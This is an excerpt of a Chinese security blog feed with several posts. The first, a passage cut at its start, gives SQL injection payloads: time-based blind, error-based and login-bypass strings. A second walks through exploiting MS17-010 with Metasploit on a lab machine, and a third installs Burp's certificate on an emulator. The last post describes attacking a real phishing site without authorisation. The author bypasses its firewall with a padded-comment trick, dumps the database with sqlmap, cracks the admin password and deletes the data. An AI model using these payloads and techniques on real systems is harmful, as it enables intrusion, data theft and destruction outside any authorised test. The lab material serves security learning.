<h5 id="猜数据库名的第一个字符"><a href="#猜数据库名的第一个字符" class="headerlink" title="猜数据库名的第一个字符"></a>猜数据库名的第一个字符</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br><span class="line">猜数据库名的第二个字符就要把substr(database(),<span class="number">2</span>,<span class="number">1</span>)修改</span><br></pre></td></tr></table></figure>
<h4 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h4><h5 id="猜表的数量"><a href="#猜表的数量" class="headerlink" title="猜表的数量"></a>猜表的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">4</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表的长度"><a href="#猜表的长度" class="headerlink" title="猜表的长度"></a>猜表的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表名的第一个字符-1"><a href="#猜表名的第一个字符-1" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">101</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜列-1"><a href="#猜列-1" class="headerlink" title="猜列"></a>猜列</h4><h5 id="猜列的数量-1"><a href="#猜列的数量-1" class="headerlink" title="猜列的数量"></a>猜列的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>)=<span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">因为已知表名 所以直接查</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的长度-1"><a href="#猜第一个列名的长度-1" class="headerlink" title="猜第一个列名的长度"></a>猜第一个列名的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜第二个列的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的第一个字符-1"><a href="#猜第一个列名的第一个字符-1" class="headerlink" title="猜第一个列名的第一个字符"></a>猜第一个列名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">105</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜列名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个列名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜数据-1"><a href="#猜数据-1" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据的数量-1"><a href="#猜数据的数量-1" class="headerlink" title="猜数据的数量"></a>猜数据的数量</h5><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">and if((<span class="name">select</span> count(列名) from 表名)=13,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的长度-1"><a href="#猜第一个数据的长度-1" class="headerlink" title="猜第一个数据的长度"></a>猜第一个数据的长度</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1))=4,sleep(5),1) --+</span><br><span class="line">如果猜第二个数据的长度就替换limit 1,1</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的第一个字符-1"><a href="#猜第一个数据的第一个字符-1" class="headerlink" title="猜第一个数据的第一个字符"></a>猜第一个数据的第一个字符</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">68</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br><span class="line">如果要猜第一个数据的第二个字符就把substr(*,<span class="number">2</span>,<span class="number">1</span>)替换</span><br><span class="line">如果要猜第二个数据的第一个字符就替换limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h2><p>MySQL报错注入通过构造payload让信息通过错误提示回显出来，主要应用与查询不回现内容，会打印错误信息；Update、insert等语句，会打印错误的信息。</p>
<h3 id="报错注入所用函数"><a href="#报错注入所用函数" class="headerlink" title="报错注入所用函数"></a>报错注入所用函数</h3><p>需用到四个函数和一个group by语句：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">group by ...	---&gt;分组语句 <span class="comment">//将查询的结果分类汇总</span></span><br><span class="line"><span class="function"><span class="title">rand</span><span class="params">()</span></span>	---&gt;随机数生成函数</span><br><span class="line"><span class="function"><span class="title">floor</span><span class="params">()</span></span>	---&gt;取整函数 <span class="comment">//用来对生成的随机数取整</span></span><br><span class="line"><span class="function"><span class="title">concat</span><span class="params">()</span></span>	---&gt;连接字符串</span><br><span class="line"><span class="function"><span class="title">count</span><span class="params">()</span></span>	---&gt;统计函数 <span class="comment">//结合group by语句统计分组后的数据</span></span><br></pre></td></tr></table></figure>
<h3 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h3><pre><code>执行查询操作时，子查询先开始，所以SELECT database()先执行，然后查询到当前数据库名称”security“，并将其传给concat函数，concat函数在对字符进行连接，
然后是rand()函数，其作用是生成一个大于0小于1的随机浮点数
floor()函数的作用是对传入的参数取整，这里将rand()生成的随机数做处理进行取整，由于rand()生成的值取整结果只能为0，所以我们这里做一点处理，使其生成一个大于0小于2的随机值，并对其取整
加上group by语句对返回的数据进行分组处理
from前的as a，是为concat((SELECT database()), floor(rand()*2))这一串取了个别名，后面使用group by分组时就不用打那么长一串了，直接使用别名就行。
在sqli-labs第五关这样网页无回显的环境下，我们是看不到任何的信息的，所以接下来才是正题，我们要利用count函数和上面的操作构成mysql内部错误，然后通过报错的提示获得我们想要的信息。
(上面的database()函数在实际注入中也可以换成其他的，如version()，具体看你想要通过报错获得的信息)
这里增加一个聚合函数count，构造的语句如下：
mysql&gt; SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;
这里利用count(*)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来：
这里我使用的是information_schema中的schemata表，因为我的数据库有7个，生成的随机结果中0和1有一定比例，不容易出现全是0或者全是1的情况，实际情况下推荐使用information_schema中的tables或者columns两个表，里面的数据条目较多，容易生成较多的随机值。
例如：
mysql&gt; SELECT count(*), concat((SELECT database()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre><h3 id="报错注入过程"><a href="#报错注入过程" class="headerlink" title="报错注入过程"></a>报错注入过程</h3><h4 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line">查第二个表就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'user'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line">查第二个列就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),floor(rand(0)<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a --+</span><br><span class="line">查第二个数据就替换limit 1,1</span><br></pre></td></tr></table></figure>
<h3 id="绕过验证-常见的为管理登陆-也称万能密码"><a href="#绕过验证-常见的为管理登陆-也称万能密码" class="headerlink" title="绕过验证(常见的为管理登陆)也称万能密码"></a>绕过验证(常见的为管理登陆)也称万能密码</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>) 用户名输入： 'or <span class="number">1</span>=<span class="number">1</span> or'  密码：任意</span><br><span class="line">(<span class="number">2</span>) Admin' -- (或'or <span class="number">1</span>=<span class="number">1</span> or' --)(admin or <span class="number">1</span>=<span class="number">1</span> --) (MSSQL)(直接输入用户名，不进行密码验证)</span><br><span class="line">(<span class="number">3</span>) 用户名输入：admin   密码输入：' or '<span class="number">1</span>'='<span class="number">1</span>  也可以</span><br><span class="line">(<span class="number">4</span>) 用户名输入：admin' or 'a'='a    密码输入：任意</span><br><span class="line">(<span class="number">5</span>) 用户名输入：' or <span class="number">1</span>=<span class="number">1</span> --</span><br><span class="line">(<span class="number">6</span>) 用户名输入：admin' or <span class="number">1</span>=<span class="number">1</span> --  密码输入：任意</span><br><span class="line">(<span class="number">7</span>) 用户名输入：<span class="number">1</span>'or'<span class="number">1</span>'='<span class="number">1</span>'or'<span class="number">1</span>'='<span class="number">1</span>   密码输入：任意</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ms17-010永恒之蓝复现</title>
    <url>/posts/fc2bb35a.html</url>
    <content><![CDATA[<h1 id="ms17-010永恒之蓝复现"><a href="#ms17-010永恒之蓝复现" class="headerlink" title="ms17-010永恒之蓝复现"></a>ms17-010永恒之蓝复现</h1><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
<a id="more"></a>
<p>现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化。</p>
<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>攻击机系统：Kali-Linux<br>攻击机IP：192.168.75.52<br>靶机系统：win7<br>靶机IP：192.168.75.142</p>
<h3 id="查看靶机系统及端口"><a href="#查看靶机系统及端口" class="headerlink" title="查看靶机系统及端口"></a>查看靶机系统及端口</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -O <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<img src="/posts/fc2bb35a/nmapsaomiao.png" class="" title="This is an nmapsaomiao image">
<h3 id="打开msf"><a href="#打开msf" class="headerlink" title="打开msf"></a>打开msf</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
<h3 id="搜索相关的漏洞插件"><a href="#搜索相关的漏洞插件" class="headerlink" title="搜索相关的漏洞插件"></a>搜索相关的漏洞插件</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command</span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
<p>Auxiliarity（辅助模块）<br>Expoit（漏洞利用模块）</p>
<h3 id="使用辅助验证插件测试"><a href="#使用辅助验证插件测试" class="headerlink" title="使用辅助验证插件测试"></a>使用辅助验证插件测试</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">1</span>                                                               yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p>这里的<code>show options</code>是显示这个插件相关的一些参数，在<code>Required</code>这一栏下面是<code>yes</code>的表示必填参数，这里面还剩<code>RHOSTS</code>这个参数没有填写即目标网段。下面设置一个目标网段，准备进行扫描测试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>设置扫描线程，插件默认是1，这里设置为10：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> threads <span class="comment">10</span></span><br><span class="line">threads <span class="comment">=&gt; 10</span></span><br></pre></td></tr></table></figure>
<p>可以执行<code>show options</code>查看自己刚刚填写的参数信息：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS       <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>                                                  yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">10</span>                                                              yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p> 执行<br> <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Host <span class="keyword">is</span> likely VULNERABLE to MS17<span class="number">-010</span>! - Windows <span class="number">7</span> Home Basic <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span>-bit)</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><br>主机可能易受MS17-010攻击!Windows 7家庭基础7601服务包1 x64位(64位)</p>
<h3 id="使用exploit模块来进行攻击"><a href="#使用exploit模块来进行攻击" class="headerlink" title="使用exploit模块来进行攻击"></a>使用exploit模块来进行攻击</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner<span class="regexp">/smb/</span>smb_ms17_010) &gt; use exploit<span class="regexp">/windows/</span>smb<span class="regexp">/ms17_010_eternalblue</span></span><br></pre></td></tr></table></figure>
<p>设置靶机ip</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>攻击</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/smb/ms17_010_eternalblue</span>) &gt; exploit</span><br></pre></td></tr></table></figure>
<img src="/posts/fc2bb35a/ip.png" class="" title="This is an ip image">
<p>完成！</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>手机添加burp证书</title>
    <url>/posts/53936b16.html</url>
    <content><![CDATA[<h1 id="手机添加burp证书"><a href="#手机添加burp证书" class="headerlink" title="手机添加burp证书"></a>手机添加burp证书</h1><p>手机使用逍遥模拟器<br>电脑windows10</p>
<a id="more"></a>
<h2 id="配置收集代理ip"><a href="#配置收集代理ip" class="headerlink" title="配置收集代理ip"></a>配置收集代理ip</h2><p>查看本机ip</p>
<img src="/posts/53936b16/image-14.png" class="" title="This is an image-14 image">
<p>进入手机设置修改代理</p>
<img src="/posts/53936b16/image-13.png" class="" title="This is an image-13 image">
<h2 id="配置burp监听代理"><a href="#配置burp监听代理" class="headerlink" title="配置burp监听代理"></a>配置burp监听代理</h2><p>添加监听代理</p>
<img src="/posts/53936b16/image-15.png" class="" title="This is an image-15 image">
<img src="/posts/53936b16/image-16.png" class="" title="This is an image-16 image">
<h2 id="手机安装CA证书"><a href="#手机安装CA证书" class="headerlink" title="手机安装CA证书"></a>手机安装CA证书</h2><p>打开手机浏览器输入 <a href="http://burp/" target="_blank" rel="noopener">http://burp/</a></p>
<img src="/posts/53936b16/image-19.png" class="" title="This is an image-19 image">
<p>点击 CA Certificate 下载证书<br>在手机中打开文件管理器 在 0/Download下</p>
<img src="/posts/53936b16/image-20.png" class="" title="This is an image-20 image">
<p>更改证书后缀名</p>
<img src="/posts/53936b16/image-23.png" class="" title="This is an image-23 image">

<p>安装证书</p>
<img src="/posts/53936b16/image-25.png" class="" title="This is an image-25 image">
<h2 id="尝试抓包"><a href="#尝试抓包" class="headerlink" title="尝试抓包"></a>尝试抓包</h2><p>打开burp抓包拦截功能</p>
<img src="/posts/53936b16/image-26.png" class="" title="This is an image-26 image">
<p>在手机浏览器输入网址</p>
<img src="/posts/53936b16/image-27.png" class="" title="This is an image-27 image">
<p>抓包成功</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>burp suite</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透LOL钓鱼网站</title>
    <url>/posts/d4529150.html</url>
    <content><![CDATA[<h1 id="渗透LOL钓鱼网站"><a href="#渗透LOL钓鱼网站" class="headerlink" title="渗透LOL钓鱼网站"></a>渗透LOL钓鱼网站</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间收到一封邮件<br>emmmm 是一个钓鱼网站</p>
<a id="more"></a>
<img src="/posts/d4529150/1.jpg" class="" title="This is an 1 image">
<img src="/posts/d4529150/2.png" class="" title="This is an 2 image">
<img src="/posts/d4529150/3.jpg" class="" title="This is an 3 image">

<h2 id="日他"><a href="#日他" class="headerlink" title="日他"></a>日他</h2><p>然后我去百度了一下 看到了  <a href="https://www.secpulse.com/archives/116392.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116392.html</a><br>爆破后台  <a href="http://www.xxx.com.cn/history/login.php" target="_blank" rel="noopener">http://www.xxx.com.cn/history/login.php</a><br>既然人家都做了信息收集我就不做了<br>输入账号密码  账号admin’ 密码 123456</p>
<img src="/posts/d4529150/4.png" class="" title="This is an 4 image">
<p>报错，把地址也爆出来了</p>
<img src="/posts/d4529150/5.png" class="" title="This is an 5 image">
<p>那么，直接用sqlmap跑一下<br>用burp抓包  抓包后 在admin后面加个“*”</p>
<img src="/posts/d4529150/6.png" class="" title="This is an 6 image">
<p>然后，sqlmap 跑注入<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch</code></p>
<img src="/posts/d4529150/8.png" class="" title="This is an 8 image">
<p>sqlmap中查库<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<h3 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h3><img src="/posts/d4529150/9.png" class="" title="This is an 9 image">
<p>有云锁  想办法bypass<br>发现只要select 查什么的时候 就会拦截</p>
<img src="/posts/d4529150/10.png" class="" title="This is an 10 image">
<p>去网上看了好多 都失败  当看到最后一个的时候 在 <code>/**/</code>中添加600个字符的时候可以绕过我试了一下</p>
<img src="/posts/d4529150/11.png" class="" title="This is an 11 image">
<p>绕过了   那么直接在lol.txt内加入     <code>/*(里面有600个字符)*/</code>  （由于我不会写tamper）</p>
<img src="/posts/d4529150/13.png" class="" title="This is an 13 image">
<p>(把sqlmap中缓存删除一下)</p>
<h3 id="sqlmap中查库"><a href="#sqlmap中查库" class="headerlink" title="sqlmap中查库"></a>sqlmap中查库</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<img src="/posts/d4529150/6666.png" class="" title="This is an 6666 image">
<p>成功绕过</p>
<h3 id="sqlmap查表"><a href="#sqlmap查表" class="headerlink" title="sqlmap查表"></a>sqlmap查表</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx --tables</code></p>
<img src="/posts/d4529150/16.png" class="" title="This is an 16 image">
<h3 id="sqlmap查列"><a href="#sqlmap查列" class="headerlink" title="sqlmap查列"></a>sqlmap查列</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx -T xxx --columns</code></p>
<img src="/posts/d4529150/18.png" class="" title="This is an 18 image">
<h3 id="sqlmap查数据"><a href="#sqlmap查数据" class="headerlink" title="sqlmap查数据"></a>sqlmap查数据</h3><img src="/posts/d4529150/19.png" class="" title="This is an 19 image">
<p>密码MD5解密后 Aaxxxxxxxx</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><img src="/posts/d4529150/20.png" class="" title="This is an 20 image">
<p>后台没有什么太多的功能无法getshell 但是数据很多<br>数据库权限是usage<br>最后删除数据</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQLMap</tag>
        <tag>Bypass</tag>
      </tags>
  </entry>
</search>
